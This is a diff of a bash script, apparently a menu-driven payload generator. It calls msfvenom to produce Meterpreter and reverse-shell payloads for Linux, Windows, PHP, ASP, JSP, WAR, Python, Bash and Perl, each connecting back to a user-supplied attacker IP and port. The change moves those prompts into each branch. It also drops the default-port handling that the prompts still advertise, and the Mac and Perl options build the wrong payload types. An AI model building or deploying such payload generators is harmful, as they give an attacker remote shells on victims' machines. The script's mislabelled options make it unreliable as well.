@@ -31,17 +31,14 @@ Option6:ShellCodes[5]
 Option7:Handlers[6]
 ==================
 "
+
 read -p "Choice~: " choice
-read -p "Input Your IP~: " ip
-read -p "Port to listen(default=4444)~: " port
-if [ -z $port ] 
-then
-port=4444
-fi
 if [[ $choice -eq 0 ]];then
 echo "Binary Payload
 ======================
 "
+read -p "Input Your IP~: " ip
+read -p "Port to listen(default=4444)~: " port
 read -p "Output file-name(file.shell)~: " output
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > $output
 if [ -f "$output" ] 
@@ -51,6 +48,11 @@ fi
 
 elif [ "$choice" -eq 1 ]
 then
+echo "Windows Payload
+======================
+"
+read -p "Input Your IP~: " ip
+read -p "Port to listen(default=4444)~: " port
 read -p "Output file-name(file.exe)~: " output_win
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > $output_win
 if [ -f "$output_win" ]
@@ -73,24 +75,32 @@ read -p "Option~: " option
 case $option in
 0)
 echo "PHP Reverse-Shell Payload"
+read -p "Input Your IP~: " ip
+read -p "Port to listen(default=4444)~: " port
 read -p "Output-filename(file.php)~: " outputphp
 msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f raw > $outputphp
 cat $outputphp | pbcopy && echo '<?php ' | tr -d '\n' > $outputphp && pbpaste >> $outputphp
 ;;
 1)
 echo "ASP Payload"
+read -p "Input Your IP~: " ip
+read -p "Port to listen(default=4444)~: " port
 read -p "Output-filename(file.asp)~: " outputasp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > $outputasp
 ;;
 
 2)
 echo "JSP Payload"
+read -p "Input Your IP~: " ip
+read -p "Port to listen(default=4444)~: " port
 read -p "Output-filename(file.jsp)~: " outputjsp
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > $outputjsp
 ;;
 
 3)
 echo "WAR Payload"
+read -p "Input Your IP~: " ip
+read -p "Port to listen(default=4444)~: " port
 read -p "Output-filename(file.war)~: " outputwar
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > $outputwar
 ;;
@@ -110,16 +120,22 @@ read -p "Option~: " option4
 case $option4 in
 0)
 echo  "Python Reverse-Shell"
+read -p "Input Your IP~: " ip
+read -p "Port to listen(default=4444)~: " port
 read -p "Output-filename(file.py)~: " outputpy
 msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=$port -f raw > $outputpy
 ;;
 1)
 echo "Bash Shell Payload"
+read -p "Input Your IP~: " ip
+read -p "Port to listen(default=4444)~: " port
 read -p "Output-filename(file.sh)~: " outputsh
 msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port -f raw > $outputsh
 ;;
 2)
 echo "Perl Shell Payload"
+read -p "Input Your IP~: " ip
+read -p "Port to listen(default=4444)~: " port
 read -p "Output-filename(file.sh)~: " outputpl
 msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port -f raw > $outputpl
 ;;
@@ -139,17 +155,23 @@ read -p "Option~: " option5
 case $option5 in
 0)
 echo "Linux-Based Shellcode"
+read -p "Input Your IP~: " ip
+read -p "Port to listen(default=4444)~: " port
 read -p "Language(ex. py): " lang
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f $lang
 ;;
 1)
 echo "Windows Based Shellcode"
+read -p "Input Your IP~: " ip
+read -p "Port to listen(default=4444)~: " port
 read -p "Language(ex. py): " lang1
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f $lang1
 ;;
 
 2)
 echo "Mac Based Shellcode"
+read -p "Input Your IP~: " ip
+read -p "Port to listen(default=4444)~: " port
 read -p "Language(ex. py): " lang2
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f $lang2
 ;;
@@ -176,12 +198,13 @@ echo "Exiting..."
 sleep 1.5
 exit
 fi
+elif [ -z $ip ]
+then
+echo "Invalid Option!"
 fi
-
 }
 function main() {
 banner
 payload
 }
 main
-         
